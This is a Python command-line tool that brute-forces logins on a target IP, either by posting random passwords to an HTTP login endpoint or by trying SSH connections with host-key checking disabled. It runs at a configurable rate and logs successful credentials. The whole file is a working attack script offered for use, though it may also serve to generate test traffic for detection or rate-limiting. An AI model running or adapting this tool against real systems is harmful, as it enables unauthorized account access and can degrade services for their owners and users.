import argparse
import asyncio
import logging.config
import os
import random
import socket
import string
import threading
from typing import Optional

import aiohttp
import asyncssh
from aiohttp import ClientConnectorError
from asyncssh import PermissionDenied, DisconnectError

MODE_SSH = "ssh"
MODE_HTTP = "http"
DEFAULT_MODE = MODE_HTTP

HTTP_RESPONSE_SUCCESS = 200

DEFAULT_PORT = 80

DEFAULT_REQUESTS_PER_SECOND = 1
DEFAULT_ENDPOINT = "api/v1/user/login"

logging_conf_path = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "logging.conf")
)
logging.config.fileConfig(logging_conf_path)
logger = logging.getLogger(__name__)

parser = argparse.ArgumentParser()


class AtomicCounter:
    """An atomic, thread-safe incrementing counter.
    From: https://gist.github.com/benhoyt/8c8a8d62debe8e5aa5340373f9c509c7
    >>> counter = AtomicCounter()
    >>> counter.increment()
    1
    >>> counter.increment(4)
    5
    >>> counter = AtomicCounter(42.5)
    >>> counter.value
    42.5
    >>> counter.increment(0.5)
    43.0
    >>> counter = AtomicCounter()
    >>> def incrementor():
    ...     for i in range(100000):
    ...         counter.increment()
    >>> threads = []
    >>> for i in range(4):
    ...     thread = threading.Thread(target=incrementor)
    ...     thread.start()
    ...     threads.append(thread)
    >>> for thread in threads:
    ...     thread.join()
    >>> counter.value
    400000
    """

    def __init__(self, initial=0):
        """Initialize a new atomic counter to given initial value (default 0)."""
        self.value = initial
        self._lock = threading.Lock()

    def increment(self, num=1):
        """Atomically increment the counter by num (default 1) and return the
        new value.
        """
        with self._lock:
            self.value += num
            return self.value


def generate_random_string(length: int):
    """Generate a random string with the combination of lowercase and uppercase letters """
    letters = string.ascii_letters
    return "".join([random.choice(letters) for i in range(length)])


class CLIArgs:
    def __init__(
        self,
        rps: int,
        target_ip: str,
        default_endpoint: str,
        port: int,
        mode: str,
        username: Optional[str],
    ):
        self.requests_per_second: int = rps
        self.ip = target_ip
        self.endpoint = default_endpoint
        self.port: int = port
        self.mode: str = mode
        self.username: Optional[str] = username

    def get_username(self):
        if not self.username:
            return generate_random_string(7)
        return self.username


def parse_cli() -> CLIArgs:
    parser.add_argument(
        "--rps",
        default=DEFAULT_REQUESTS_PER_SECOND,
        type=int,
        help="Number of requests per second that will be fired at the target host",
    )
    parser.add_argument(
        "--ip",
        help="The IP Address of the host machine that you are targetting",
        required=True,
    )
    parser.add_argument(
        "--port",
        help=f"The L4 port of the host machine that you are targetting, defaults to {DEFAULT_PORT}",
        default=DEFAULT_PORT,
        type=int,
    )
    parser.add_argument(
        "--endpoint",
        default=DEFAULT_ENDPOINT,
        help=f"The IP Address of the host machine that you are targetting, defaults to {DEFAULT_ENDPOINT}",
    )
    parser.add_argument(
        "--mode",
        default=DEFAULT_MODE,
        choices=[MODE_SSH, MODE_HTTP],
        help=f"The mode of attack, defaults to {DEFAULT_MODE}",
    )
    parser.add_argument(
        "--username",
        help=f"If not passed the system will randomly generate a string, otherwise it will always use this value when doing the attack",
        default="sample_username",
    )
    arguments = parser.parse_args()

    return CLIArgs(
        arguments.rps,
        arguments.ip,
        arguments.endpoint,
        arguments.port,
        arguments.mode,
        arguments.username,
    )


async def do_post(
    session, url: str, username: str, password: str, counter: AtomicCounter
):
    data = {"username": username, "password": password}

    iteration = counter.increment()

    logger.debug(
        f"Attack attempt {iteration}:\t{url} with username:{username}\tpassword:{password}"
    )
    response = await session.post(url, data=data)

    if response.status != HTTP_RESPONSE_SUCCESS:
        logger.warning(f"Attack attempt {iteration} failed!")
        logger.debug(f"{await response.text()}")


async def start_brute_force(cli_options: CLIArgs, counter: AtomicCounter):
    logger.info(f"Doing {cli_options.mode} based brute force attack")

    if cli_options.mode == MODE_HTTP:
        await do_http_brute_force(cli_options, counter)
    elif cli_options.mode == MODE_SSH:
        await do_ssh_brute_force(cli_options, counter)

    raise Exception(f"Unknown type of attack requested, type={cli_options.mode}")


async def do_http_brute_force(cli_options: CLIArgs, counter: AtomicCounter):
    url: str = f"http://{cli_options.ip}:{cli_options.port}/{cli_options.endpoint}"

    async with aiohttp.ClientSession() as session:
        while True:
            for i in range(0, cli_options.requests_per_second):
                await do_post(
                    session,
                    url,
                    cli_options.get_username(),
                    generate_random_string(7),
                    counter,
                )
            # Sleep every second
            await asyncio.sleep(1)


async def do_ssh_connect(ip: str, username: str, password: str, counter: AtomicCounter):
    iteration = counter.increment()

    logger.debug(
        f"Attack attempt {iteration}:\t{ip} with username:{username}\tpassword:{password}"
    )

    try:
        # TODO known_hosts=None disables checking but makes us susceptible to MITM
        async with asyncssh.connect(
            ip, username=username, password=password, known_hosts=None
        ) as conn:
            logger.info(
                f"Successfully connected over ssh to {ip} with {username}:{password}"
            )
            return await conn.run("exit")
    except PermissionDenied:
        logger.debug(f"Permission denied while doing SSH attack attempt {iteration}")
    except (DisconnectError, socket.gaierror) as e:
        logger.debug(
            f"Connectivity issue while doing SSH attack attempt {iteration}, if {ip} is a hostname, it is most likely not being resolved."
        )
    except Exception as e:
        logger.error(
            f"Unknown error occurred while doing SSH attack attempt {iteration}"
        )


async def do_ssh_brute_force(cli_options: CLIArgs, counter: AtomicCounter):
    while True:
        tasks = (
            do_ssh_connect(
                cli_options.ip,
                cli_options.get_username(),
                generate_random_string(7),
                counter,
            )
            for i in range(0, cli_options.requests_per_second)
        )
        await asyncio.gather(*tasks, return_exceptions=True)
        # Sleep every second
        await asyncio.sleep(1)


async def main():
    cli_options: CLIArgs = parse_cli()
    counter: AtomicCounter = AtomicCounter()
    await start_brute_force(cli_options, counter)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except ClientConnectorError as e:
        logger.error(
            "Failed to connect to the server, are you sure the host information (IP and Port) are correct?"
        )
        logger.info("Stopping attack")
        logger.info(parser.print_help())
    finally:
        loop.close()
